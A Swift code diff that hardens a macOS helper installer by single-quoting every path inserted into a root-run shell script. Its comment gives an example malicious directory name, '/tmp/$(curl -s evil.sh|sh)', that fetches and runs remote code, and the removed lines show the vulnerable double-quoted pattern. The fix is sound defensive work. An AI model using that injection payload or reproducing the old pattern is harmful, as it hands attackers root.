@@ -42,18 +42,28 @@ enum HelperInstaller {
         HKMLog.info("后台服务安装完成")
     }
 
-    private static func makeScript(helperPath: String, uid: uid_t) -> String {
-        """
+    /// 安装脚本。
+    ///
+    /// 脚本会被 `/bin/sh` 执行，所以**每一个**变量都必须经 `ShellQuote.quote`
+    /// 包成单引号：双引号挡不住 `$()` 和反引号，App 放在一个叫
+    /// `/tmp/$(curl -s evil.sh|sh)` 的目录里时，用户点「授权」就等于给了 root。
+    /// 内部方法而不是 private，是为了让测试能直接检查生成的正文。
+    static func makeScript(helperPath: String, uid: uid_t) -> String {
+        let source = ShellQuote.quote(helperPath)
+        let binary = ShellQuote.quote(HelperPaths.binaryPath)
+        let plist = ShellQuote.quote(HelperPaths.plistPath)
+        let allowedUID = ShellQuote.quote(HelperPaths.allowedUIDPath)
+        return """
         set -e
         mkdir -p /Library/PrivilegedHelperTools
-        cp "\(helperPath)" "\(HelperPaths.binaryPath)"
-        chown root:wheel "\(HelperPaths.binaryPath)"
-        chmod 755 "\(HelperPaths.binaryPath)"
-        codesign --force --sign - "\(HelperPaths.binaryPath)" >/dev/null 2>&1 || true
+        cp \(source) \(binary)
+        chown root:wheel \(binary)
+        chmod 755 \(binary)
+        codesign --force --sign - \(binary) >/dev/null 2>&1 || true
         mkdir -p "/Library/Application Support/HeadlessKnightMaster"
-        echo "\(uid)" > "\(HelperPaths.allowedUIDPath)"
-        chmod 644 "\(HelperPaths.allowedUIDPath)"
-        cat > "\(HelperPaths.plistPath)" <<'HKMPLIST'
+        echo "\(uid)" > \(allowedUID)
+        chmod 644 \(allowedUID)
+        cat > \(plist) <<'HKMPLIST'
         <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
         <plist version="1.0">
@@ -73,11 +83,11 @@ enum HelperInstaller {
         </dict>
         </plist>
         HKMPLIST
-        chown root:wheel "\(HelperPaths.plistPath)"
-        chmod 644 "\(HelperPaths.plistPath)"
+        chown root:wheel \(plist)
+        chmod 644 \(plist)
         launchctl bootout system/\(HelperPaths.label) >/dev/null 2>&1 || true
         launchctl enable system/\(HelperPaths.label)
-        launchctl bootstrap system "\(HelperPaths.plistPath)"
+        launchctl bootstrap system \(plist)
         """
     }
 }
